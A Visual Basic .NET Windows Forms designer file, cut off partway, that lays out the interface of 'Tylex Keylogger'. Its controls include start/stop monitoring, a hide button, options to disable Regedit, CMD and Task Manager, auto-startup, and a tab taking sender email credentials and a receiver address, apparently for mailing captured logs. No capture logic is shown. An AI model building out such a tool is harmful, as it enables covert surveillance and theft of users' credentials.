<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Main_Menu
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Main_Menu))
        Me.tabBoxControl = New System.Windows.Forms.TabControl()
        Me.tabMaster = New System.Windows.Forms.TabPage()
        Me.btnHide = New System.Windows.Forms.Button()
        Me.richLogBox = New System.Windows.Forms.RichTextBox()
        Me.btnClear = New System.Windows.Forms.Button()
        Me.btnSave = New System.Windows.Forms.Button()
        Me.btnStop = New System.Windows.Forms.Button()
        Me.groupPanel = New System.Windows.Forms.GroupBox()
        Me.cekRegedit = New System.Windows.Forms.CheckBox()
        Me.cekCmd = New System.Windows.Forms.CheckBox()
        Me.cekTask = New System.Windows.Forms.CheckBox()
        Me.cekStartup = New System.Windows.Forms.CheckBox()
        Me.btnStart = New System.Windows.Forms.Button()
        Me.tabMail = New System.Windows.Forms.TabPage()
        Me.lblStatus = New System.Windows.Forms.Label()
        Me.lblMailActive = New System.Windows.Forms.Label()
        Me.btnDisable = New System.Windows.Forms.Button()
        Me.btnEnable = New System.Windows.Forms.Button()
        Me.lblReceiver = New System.Windows.Forms.Label()
        Me.txtReceiver = New System.Windows.Forms.TextBox()
        Me.btnMail = New System.Windows.Forms.Button()
        Me.lblSenderPass = New System.Windows.Forms.Label()
        Me.lblSender = New System.Windows.Forms.Label()
        Me.txtPassword = New System.Windows.Forms.TextBox()
        Me.txtEmail = New System.Windows.Forms.TextBox()
        Me.tabAbout = New System.Windows.Forms.TabPage()
        Me.btnDonate = New System.Windows.Forms.Button()
        Me.LinkLabel3 = New System.Windows.Forms.LinkLabel()
        Me.Label7 = New System.Windows.Forms.Label()
        Me.Label6 = New System.Windows.Forms.Label()
        Me.Label5 = New System.Windows.Forms.Label()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.PictureBox1 = New System.Windows.Forms.PictureBox()
        Me.Panel1 = New System.Windows.Forms.Panel()
        Me.picMin = New System.Windows.Forms.PictureBox()
        Me.lblFormTitle = New System.Windows.Forms.Label()
        Me.picClose = New System.Windows.Forms.PictureBox()
        Me.StatusStrip1 = New System.Windows.Forms.StatusStrip()
        Me.lblCopy = New System.Windows.Forms.ToolStripStatusLabel()
        Me.lblLink = New System.Windows.Forms.ToolStripStatusLabel()
        Me.lblDate = New System.Windows.Forms.ToolStripStatusLabel()
        Me.timeLogger = New System.Windows.Forms.Timer(Me.components)
        Me.saveBox = New System.Windows.Forms.SaveFileDialog()
        Me.NotifyIcon1 = New System.Windows.Forms.NotifyIcon(Me.components)
        Me.timeMail = New System.Windows.Forms.Timer(Me.components)
        Me.timeLog = New System.Windows.Forms.Timer(Me.components)
        Me.timeKususJam = New System.Windows.Forms.Timer(Me.components)
        Me.Label4 = New System.Windows.Forms.Label()
        Me.Label8 = New System.Windows.Forms.Label()
        Me.Label9 = New System.Windows.Forms.Label()
        Me.tabBoxControl.SuspendLayout()
        Me.tabMaster.SuspendLayout()
        Me.groupPanel.SuspendLayout()
        Me.tabMail.SuspendLayout()
        Me.tabAbout.SuspendLayout()
        CType(Me.PictureBox1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.Panel1.SuspendLayout()
        CType(Me.picMin, System.ComponentModel.ISupportInitialize).BeginInit()
        CType(Me.picClose, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.StatusStrip1.SuspendLayout()
        Me.SuspendLayout()
        '
        'tabBoxControl
        '
        Me.tabBoxControl.Controls.Add(Me.tabMaster)
        Me.tabBoxControl.Controls.Add(Me.tabMail)
        Me.tabBoxControl.Controls.Add(Me.tabAbout)
        Me.tabBoxControl.Font = New System.Drawing.Font("Lucida Console", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.tabBoxControl.Location = New System.Drawing.Point(12, 32)
        Me.tabBoxControl.Multiline = True
        Me.tabBoxControl.Name = "tabBoxControl"
        Me.tabBoxControl.RightToLeft = System.Windows.Forms.RightToLeft.No
        Me.tabBoxControl.SelectedIndex = 0
        Me.tabBoxControl.Size = New System.Drawing.Size(449, 271)
        Me.tabBoxControl.TabIndex = 0
        '
        'tabMaster
        '
        Me.tabMaster.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(39, Byte), Integer), CType(CType(46, Byte), Integer))
        Me.tabMaster.Controls.Add(Me.btnHide)
        Me.tabMaster.Controls.Add(Me.richLogBox)
        Me.tabMaster.Controls.Add(Me.btnClear)
        Me.tabMaster.Controls.Add(Me.btnSave)
        Me.tabMaster.Controls.Add(Me.btnStop)
        Me.tabMaster.Controls.Add(Me.groupPanel)
        Me.tabMaster.Controls.Add(Me.btnStart)
        Me.tabMaster.ForeColor = System.Drawing.Color.WhiteSmoke
        Me.tabMaster.Location = New System.Drawing.Point(4, 21)
        Me.tabMaster.Name = "tabMaster"
        Me.tabMaster.Padding = New System.Windows.Forms.Padding(3)
        Me.tabMaster.Size = New System.Drawing.Size(441, 246)
        Me.tabMaster.TabIndex = 0
        Me.tabMaster.Text = "Master"
        '
        'btnHide
        '
        Me.btnHide.BackColor = System.Drawing.Color.FromArgb(CType(CType(25, Byte), Integer), CType(CType(42, Byte), Integer), CType(CType(86, Byte), Integer))
        Me.btnHide.Enabled = False
        Me.btnHide.FlatAppearance.BorderColor = System.Drawing.Color.White
        Me.btnHide.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent
        Me.btnHide.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Transparent
        Me.btnHide.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnHide.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnHide.ForeColor = System.Drawing.SystemColors.ControlLightLight
        Me.btnHide.Location = New System.Drawing.Point(6, 79)
        Me.btnHide.Name = "btnHide"
        Me.btnHide.Size = New System.Drawing.Size(71, 28)
        Me.btnHide.TabIndex = 3
        Me.btnHide.TabStop = False
        Me.btnHide.Text = "Hide Me"
        Me.btnHide.UseVisualStyleBackColor = False
        '
        'richLogBox
        '
        Me.richLogBox.BackColor = System.Drawing.Color.FromArgb(CType(CType(236, Byte), Integer), CType(CType(240, Byte), Integer), CType(CType(241, Byte), Integer))
        Me.richLogBox.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.richLogBox.Cursor = System.Windows.Forms.Cursors.IBeam
        Me.richLogBox.Location = New System.Drawing.Point(83, 5)
        Me.richLogBox.Name = "richLogBox"
        Me.richLogBox.ReadOnly = True
        Me.richLogBox.Size = New System.Drawing.Size(355, 177)
        Me.richLogBox.TabIndex = 12
        Me.richLogBox.TabStop = False
        Me.richLogBox.Text = ""
        '
        'btnClear
        '
        Me.btnClear.BackColor = System.Drawing.Color.FromArgb(CType(CType(25, Byte), Integer), CType(CType(42, Byte), Integer), CType(CType(86, Byte), Integer))
        Me.btnClear.Enabled = False
        Me.btnClear.FlatAppearance.BorderColor = System.Drawing.Color.White
        Me.btnClear.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent
        Me.btnClear.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(CType(CType(149, Byte), Integer), CType(CType(165, Byte), Integer), CType(CType(166, Byte), Integer))
        Me.btnClear.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnClear.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnClear.ForeColor = System.Drawing.SystemColors.ControlLightLight
        Me.btnClear.Location = New System.Drawing.Point(6, 116)
        Me.btnClear.Name = "btnClear"
        Me.btnClear.Size = New System.Drawing.Size(71, 28)
        Me.btnClear.TabIndex = 4
        Me.btnClear.TabStop = False
        Me.btnClear.Text = "Clear Log"
        Me.btnClear.UseVisualStyleBackColor = False
        '
        'btnSave
        '
        Me.btnSave.BackColor = System.Drawing.Color.FromArgb(CType(CType(25, Byte), Integer), CType(CType(42, Byte), Integer), CType(CType(86, Byte), Integer))
        Me.btnSave.FlatAppearance.BorderColor = System.Drawing.Color.White
        Me.btnSave.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent
        Me.btnSave.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(CType(CType(251, Byte), Integer), CType(CType(197, Byte), Integer), CType(CType(49, Byte), Integer))
        Me.btnSave.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnSave.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnSave.ForeColor = System.Drawing.SystemColors.ControlLightLight
        Me.btnSave.Location = New System.Drawing.Point(6, 154)
        Me.btnSave.Name = "btnSave"
        Me.btnSave.Size = New System.Drawing.Size(71, 28)
        Me.btnSave.TabIndex = 5
        Me.btnSave.TabStop = False
        Me.btnSave.Text = "Save Log"
        Me.btnSave.UseVisualStyleBackColor = False
        '
        'btnStop
        '
        Me.btnStop.BackColor = System.Drawing.Color.FromArgb(CType(CType(25, Byte), Integer), CType(CType(42, Byte), Integer), CType(CType(86, Byte), Integer))
        Me.btnStop.Enabled = False
        Me.btnStop.FlatAppearance.BorderColor = System.Drawing.Color.White
        Me.btnStop.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent
        Me.btnStop.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(CType(CType(231, Byte), Integer), CType(CType(76, Byte), Integer), CType(CType(60, Byte), Integer))
        Me.btnStop.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnStop.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnStop.ForeColor = System.Drawing.SystemColors.ControlLightLight
        Me.btnStop.Location = New System.Drawing.Point(6, 41)
        Me.btnStop.Name = "btnStop"
        Me.btnStop.Size = New System.Drawing.Size(71, 28)
        Me.btnStop.TabIndex = 2
        Me.btnStop.TabStop = False
        Me.btnStop.Text = "Stop Mon"
        Me.btnStop.UseVisualStyleBackColor = False
        '
        'groupPanel
        '
        Me.groupPanel.BackColor = System.Drawing.Color.Transparent
        Me.groupPanel.Controls.Add(Me.cekRegedit)
        Me.groupPanel.Controls.Add(Me.cekCmd)
        Me.groupPanel.Controls.Add(Me.cekTask)
        Me.groupPanel.Controls.Add(Me.cekStartup)
        Me.groupPanel.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.groupPanel.ForeColor = System.Drawing.Color.White
        Me.groupPanel.Location = New System.Drawing.Point(4, 189)
        Me.groupPanel.Name = "groupPanel"
        Me.groupPanel.Size = New System.Drawing.Size(432, 53)
        Me.groupPanel.TabIndex = 8
        Me.groupPanel.TabStop = False
        Me.groupPanel.Text = "Control Panel"
        '
        'cekRegedit
        '
        Me.cekRegedit.AutoSize = True
        Me.cekRegedit.Location = New System.Drawing.Point(29, 32)
        Me.cekRegedit.Name = "cekRegedit"
        Me.cekRegedit.Size = New System.Drawing.Size(129, 15)
        Me.cekRegedit.TabIndex = 9999
        Me.cekRegedit.TabStop = False
        Me.cekRegedit.Text = "Disable Regedit"
        Me.cekRegedit.UseVisualStyleBackColor = True
        '
        'cekCmd
        '
        Me.cekCmd.AutoSize = True
        Me.cekCmd.Location = New System.Drawing.Point(243, 32)
        Me.cekCmd.Name = "cekCmd"
        Me.cekCmd.Size = New System.Drawing.Size(101, 15)
        Me.cekCmd.TabIndex = 5
        Me.cekCmd.TabStop = False
        Me.cekCmd.Text = "Disable CMD"
        Me.cekCmd.UseVisualStyleBackColor = True
        '
        'cekTask
        '
        Me.cekTask.AutoSize = True
        Me.cekTask.Location = New System.Drawing.Point(243, 11)
        Me.cekTask.Name = "cekTask"
        Me.cekTask.Size = New System.Drawing.Size(164, 15)
        Me.cekTask.TabIndex = 4
        Me.cekTask.TabStop = False
        Me.cekTask.Text = "Disable Task Manager"
        Me.cekTask.UseVisualStyleBackColor = True
        '
        'cekStartup
        '
        Me.cekStartup.AutoSize = True
        Me.cekStartup.Location = New System.Drawing.Point(29, 11)
        Me.cekStartup.Name = "cekStartup"
        Me.cekStartup.Size = New System.Drawing.Size(108, 15)
        Me.cekStartup.TabIndex = 99999
        Me.cekStartup.TabStop = False
        Me.cekStartup.Text = "Auto Startup"
        Me.cekStartup.UseVisualStyleBackColor = True
        '
        'btnStart
        '
        Me.btnStart.BackColor = System.Drawing.Color.FromArgb(CType(CType(25, Byte), Integer), CType(CType(42, Byte), Integer), CType(CType(86, Byte), Integer))
        Me.btnStart.FlatAppearance.BorderColor = System.Drawing.Color.White
        Me.btnStart.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent
        Me.btnStart.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(CType(CType(46, Byte), Integer), CType(CType(204, Byte), Integer), CType(CType(113, Byte), Integer))
        Me.btnStart.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnStart.Font = New System.Drawing.Font("Microsoft Sans Serif", 8.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnStart.ForeColor = System.Drawing.SystemColors.ControlLightLight
        Me.btnStart.Location = New System.Drawing.Point(6, 5)
        Me.btnStart.Name = "btnStart"
        Me.btnStart.Size = New System.Drawing.Size(71, 28)
        Me.btnStart.TabIndex = 1
        Me.btnStart.TabStop = False
        Me.btnStart.Text = "Start Mon"
        Me.btnStart.UseVisualStyleBackColor = False
        '
        'tabMail
        '
        Me.tabMail.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(39, Byte), Integer), CType(CType(46, Byte), Integer))
        Me.tabMail.Controls.Add(Me.lblStatus)
        Me.tabMail.Controls.Add(Me.lblMailActive)
        Me.tabMail.Controls.Add(Me.btnDisable)
        Me.tabMail.Controls.Add(Me.btnEnable)
        Me.tabMail.Controls.Add(Me.lblReceiver)
        Me.tabMail.Controls.Add(Me.txtReceiver)
        Me.tabMail.Controls.Add(Me.btnMail)
        Me.tabMail.Controls.Add(Me.lblSenderPass)
        Me.tabMail.Controls.Add(Me.lblSender)
        Me.tabMail.Controls.Add(Me.txtPassword)
        Me.tabMail.Controls.Add(Me.txtEmail)
        Me.tabMail.Location = New System.Drawing.Point(4, 21)
        Me.tabMail.Name = "tabMail"
        Me.tabMail.Padding = New System.Windows.Forms.Padding(3)
        Me.tabMail.Size = New System.Drawing.Size(441, 246)
        Me.tabMail.TabIndex = 1
        Me.tabMail.Text = "Send Mail"
        '
        'lblStatus
        '
        Me.lblStatus.AutoSize = True
        Me.lblStatus.Font = New System.Drawing.Font("Lucida Console", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblStatus.Location = New System.Drawing.Point(6, 225)
        Me.lblStatus.Name = "lblStatus"
        Me.lblStatus.Size = New System.Drawing.Size(61, 12)
        Me.lblStatus.TabIndex = 14
        Me.lblStatus.Text = "Status :"
        '
        'lblMailActive
        '
        Me.lblMailActive.AutoSize = True
        Me.lblMailActive.Font = New System.Drawing.Font("Lucida Console", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblMailActive.Location = New System.Drawing.Point(73, 225)
        Me.lblMailActive.Name = "lblMailActive"
        Me.lblMailActive.Size = New System.Drawing.Size(47, 12)
        Me.lblMailActive.TabIndex = 10
        Me.lblMailActive.Text = "Label1"
        Me.lblMailActive.Visible = False
        '
        'btnDisable
        '
        Me.btnDisable.BackColor = System.Drawing.Color.FromArgb(CType(CType(25, Byte), Integer), CType(CType(42, Byte), Integer), CType(CType(86, Byte), Integer))
        Me.btnDisable.FlatAppearance.BorderColor = System.Drawing.Color.White
        Me.btnDisable.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent
        Me.btnDisable.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(CType(CType(46, Byte), Integer), CType(CType(204, Byte), Integer), CType(CType(113, Byte), Integer))
        Me.btnDisable.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnDisable.Font = New System.Drawing.Font("Lucida Console", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnDisable.ForeColor = System.Drawing.SystemColors.ControlLightLight
        Me.btnDisable.Location = New System.Drawing.Point(128, 178)
        Me.btnDisable.Name = "btnDisable"
        Me.btnDisable.Size = New System.Drawing.Size(79, 28)
        Me.btnDisable.TabIndex = 12
        Me.btnDisable.TabStop = False
        Me.btnDisable.Text = "Disable"
        Me.btnDisable.UseVisualStyleBackColor = False
        '
        'btnEnable
        '
        Me.btnEnable.BackColor = System.Drawing.Color.FromArgb(CType(CType(25, Byte), Integer), CType(CType(42, Byte), Integer), CType(CType(86, Byte), Integer))
        Me.btnEnable.FlatAppearance.BorderColor = System.Drawing.Color.White
        Me.btnEnable.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent
        Me.btnEnable.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(CType(CType(46, Byte), Integer), CType(CType(204, Byte), Integer), CType(CType(113, Byte), Integer))
        Me.btnEnable.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnEnable.Font = New System.Drawing.Font("Lucida Console", 9.75!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnEnable.ForeColor = System.Drawing.SystemColors.ControlLightLight
        Me.btnEnable.Location = New System.Drawing.Point(41, 178)
        Me.btnEnable.Name = "btnEnable"
        Me.btnEnable.Size = New System.Drawing.Size(79, 28)
        Me.btnEnable.TabIndex = 11
        Me.btnEnable.TabStop = False
        Me.btnEnable.Text = "Enable"
        Me.btnEnable.UseVisualStyleBackColor = False
        '
        'lblReceiver
        '
        Me.lblReceiver.AutoSize = True
        Me.lblReceiver.Font = New System.Drawing.Font("Lucida Console", 10.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblReceiver.Location = New System.Drawing.Point(40, 106)
        Me.lblReceiver.Name = "lblReceiver"
        Me.lblReceiver.Size = New System.Drawing.Size(119, 14)
        Me.lblReceiver.TabIndex = 7
        Me.lblReceiver.Text = "Email Receiver"
        '
        'txtReceiver
        '
        Me.txtReceiver.Location = New System.Drawing.Point(199, 102)
        Me.txtReceiver.Name = "txtReceiver"
        Me.txtReceiver.Size = New System.Drawing.Size(211, 18)
        Me.txtReceiver.TabIndex = 3
        '
        'btnMail
        '
        Me.btnMail.BackColor = System.Drawing.Color.FromArgb(CType(CType(25, Byte), Integer), CType(CType(42, Byte), Integer), CType(CType(86, Byte), Integer))
        Me.btnMail.FlatAppearance.BorderColor = System.Drawing.Color.White
        Me.btnMail.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent
        Me.btnMail.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(CType(CType(46, Byte), Integer), CType(CType(204, Byte), Integer), CType(CType(113, Byte), Integer))
        Me.btnMail.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnMail.Font = New System.Drawing.Font("Microsoft Sans Serif", 10.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.btnMail.ForeColor = System.Drawing.SystemColors.ControlLightLight
        Me.btnMail.Location = New System.Drawing.Point(311, 137)
        Me.btnMail.Name = "btnMail"
        Me.btnMail.Size = New System.Drawing.Size(99, 28)
        Me.btnMail.TabIndex = 3
        Me.btnMail.Text = "Set Email"
        Me.btnMail.UseVisualStyleBackColor = False
        '
        'lblSenderPass
        '
        Me.lblSenderPass.AutoSize = True
        Me.lblSenderPass.Font = New System.Drawing.Font("Lucida Console", 10.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblSenderPass.Location = New System.Drawing.Point(40, 54)
        Me.lblSenderPass.Name = "lblSenderPass"
        Me.lblSenderPass.Size = New System.Drawing.Size(127, 14)
        Me.lblSenderPass.TabIndex = 3
        Me.lblSenderPass.Text = "Password Sender"
        '
        'lblSender
        '
        Me.lblSender.AutoSize = True
        Me.lblSender.Font = New System.Drawing.Font("Lucida Console", 10.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblSender.Location = New System.Drawing.Point(40, 23)
        Me.lblSender.Name = "lblSender"
        Me.lblSender.Size = New System.Drawing.Size(103, 14)
        Me.lblSender.TabIndex = 2
        Me.lblSender.Text = "Email Sender"
        '
        'txtPassword
        '
        Me.txtPassword.Location = New System.Drawing.Point(199, 50)
        Me.txtPassword.Name = "txtPassword"
        Me.txtPassword.PasswordChar = Global.Microsoft.VisualBasic.ChrW(42)
        Me.txtPassword.Size = New System.Drawing.Size(148, 18)
        Me.txtPassword.TabIndex = 1
        '
        'txtEmail
        '
        Me.txtEmail.Location = New System.Drawing.Point(199, 19)
        Me.txtEmail.Name = "txtEmail"
        Me.txtEmail.Size = New System.Drawing.Size(211, 18)
        Me.txtEmail.TabIndex = 0
        '
        'tabAbout
        '
        Me.tabAbout.BackColor = System.Drawing.Color.FromArgb(CType(CType(30, Byte), Integer), CType(CType(39, Byte), Integer), CType(CType(46, Byte), Integer))
        Me.tabAbout.Controls.Add(Me.Label9)
        Me.tabAbout.Controls.Add(Me.Label8)
        Me.tabAbout.Controls.Add(Me.Label4)
        Me.tabAbout.Controls.Add(Me.btnDonate)
        Me.tabAbout.Controls.Add(Me.LinkLabel3)
        Me.tabAbout.Controls.Add(Me.Label7)
        Me.tabAbout.Controls.Add(Me.Label6)
        Me.tabAbout.Controls.Add(Me.Label5)
        Me.tabAbout.Controls.Add(Me.Label3)
        Me.tabAbout.Controls.Add(Me.Label2)
        Me.tabAbout.Controls.Add(Me.Label1)
        Me.tabAbout.Controls.Add(Me.PictureBox1)
        Me.tabAbout.Location = New System.Drawing.Point(4, 21)
        Me.tabAbout.Name = "tabAbout"
        Me.tabAbout.Size = New System.Drawing.Size(441, 246)
        Me.tabAbout.TabIndex = 2
        Me.tabAbout.Text = "About"
        '
        'btnDonate
        '
        Me.btnDonate.BackColor = System.Drawing.Color.FromArgb(CType(CType(25, Byte), Integer), CType(CType(42, Byte), Integer), CType(CType(86, Byte), Integer))
        Me.btnDonate.Enabled = False
        Me.btnDonate.FlatAppearance.BorderColor = System.Drawing.Color.White
        Me.btnDonate.FlatAppearance.MouseDownBackColor = System.Drawing.Color.Transparent
        Me.btnDonate.FlatAppearance.MouseOverBackColor = System.Drawing.Color.FromArgb(CType(CType(46, Byte), Integer), CType(CType(204, Byte), Integer), CType(CType(113, Byte), Integer))
        Me.btnDonate.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.btnDonate.ForeColor = System.Drawing.SystemColors.ControlLightLight
        Me.btnDonate.Location = New System.Drawing.Point(202, 142)
        Me.btnDonate.Name = "btnDonate"
        Me.btnDonate.Size = New System.Drawing.Size(85, 28)
        Me.btnDonate.TabIndex = 12
        Me.btnDonate.Text = "Donate"
        Me.btnDonate.UseVisualStyleBackColor = False
        '
        'LinkLabel3
        '
        Me.LinkLabel3.AutoSize = True
        Me.LinkLabel3.Font = New System.Drawing.Font("Lucida Console", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.LinkLabel3.LinkBehavior = System.Windows.Forms.LinkBehavior.NeverUnderline
        Me.LinkLabel3.LinkColor = System.Drawing.Color.White
        Me.LinkLabel3.Location = New System.Drawing.Point(289, 113)
        Me.LinkLabel3.Name = "LinkLabel3"
        Me.LinkLabel3.Size = New System.Drawing.Size(96, 12)
        Me.LinkLabel3.TabIndex = 11
        Me.LinkLabel3.TabStop = True
        Me.LinkLabel3.Text = "Kuliah Barbar"
        Me.LinkLabel3.VisitedLinkColor = System.Drawing.Color.FromArgb(CType(CType(25, Byte), Integer), CType(CType(42, Byte), Integer), CType(CType(86, Byte), Integer))
        '
        'Label7
        '
        Me.Label7.AutoSize = True
        Me.Label7.Font = New System.Drawing.Font("Lucida Console", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label7.Location = New System.Drawing.Point(289, 92)
        Me.Label7.Name = "Label7"
        Me.Label7.Size = New System.Drawing.Size(75, 12)
        Me.Label7.TabIndex = 7
        Me.Label7.Text = "Alderson21"
        '
        'Label6
        '
        Me.Label6.AutoSize = True
        Me.Label6.Font = New System.Drawing.Font("Lucida Console", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label6.Location = New System.Drawing.Point(289, 68)
        Me.Label6.Name = "Label6"
        Me.Label6.Size = New System.Drawing.Size(117, 12)
        Me.Label6.TabIndex = 6
        Me.Label6.Text = "Open v1.0 (Beta)"
        '
        'Label5
        '
        Me.Label5.AutoSize = True
        Me.Label5.Font = New System.Drawing.Font("Lucida Console", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label5.Location = New System.Drawing.Point(200, 113)
        Me.Label5.Name = "Label5"
        Me.Label5.Size = New System.Drawing.Size(75, 12)
        Me.Label5.TabIndex = 5
        Me.Label5.Text = "Community "
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Font = New System.Drawing.Font("Lucida Console", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label3.Location = New System.Drawing.Point(200, 91)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(61, 12)
        Me.Label3.TabIndex = 3
        Me.Label3.Text = "Codename"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Font = New System.Drawing.Font("Lucida Console", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label2.Location = New System.Drawing.Point(200, 68)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(54, 12)
        Me.Label2.TabIndex = 2
        Me.Label2.Text = "Version"
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Font = New System.Drawing.Font("Tekton Pro Ext", 12.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label1.Location = New System.Drawing.Point(198, 33)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(140, 20)
        Me.Label1.TabIndex = 1
        Me.Label1.Text = "Tylex Keylogger"
        '
        'PictureBox1
        '
        Me.PictureBox1.BackgroundImage = CType(resources.GetObject("PictureBox1.BackgroundImage"), System.Drawing.Image)
        Me.PictureBox1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom
        Me.PictureBox1.Location = New System.Drawing.Point(18, 33)
        Me.PictureBox1.Name = "PictureBox1"
        Me.PictureBox1.Size = New System.Drawing.Size(173, 183)
        Me.PictureBox1.TabIndex = 0
        Me.PictureBox1.TabStop = False
        '
        'Panel1
        '
        Me.Panel1.BackColor = System.Drawing.Color.FromArgb(CType(CType(25, Byte), Integer), CType(CType(42, Byte), Integer), CType(CType(86, Byte), Integer))
        Me.Panel1.Controls.Add(Me.picMin)
        Me.Panel1.Controls.Add(Me.lblFormTitle)
        Me.Panel1.Controls.Add(Me.picClose)
        Me.Panel1.Location = New System.Drawing.Point(0, 0)
        Me.Panel1.Name = "Panel1"
        Me.Panel1.Size = New System.Drawing.Size(473, 25)
        Me.Panel1.TabIndex = 1
        '
        'picMin
        '
        Me.picMin.BackgroundImage = CType(resources.GetObject("picMin.BackgroundImage"), System.Drawing.Image)
        Me.picMin.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch
        Me.picMin.Location = New System.Drawing.Point(437, 3)
        Me.picMin.Name = "picMin"
        Me.picMin.Size = New System.Drawing.Size(16, 17)
        Me.picMin.TabIndex = 5
        Me.picMin.TabStop = False
        '
        'lblFormTitle
        '
        Me.lblFormTitle.AutoSize = True
        Me.lblFormTitle.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.lblFormTitle.Font = New System.Drawing.Font("Verdana", 9.0!, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.lblFormTitle.Location = New System.Drawing.Point(9, 6)
        Me.lblFormTitle.Name = "lblFormTitle"
        Me.lblFormTitle.Size = New System.Drawing.Size(114, 14)
        Me.lblFormTitle.TabIndex = 2
        Me.lblFormTitle.Text = "Tylex Keylogger"
        '
        'picClose
        '
        Me.picClose.BackgroundImage = CType(resources.GetObject("picClose.BackgroundImage"), System.Drawing.Image)
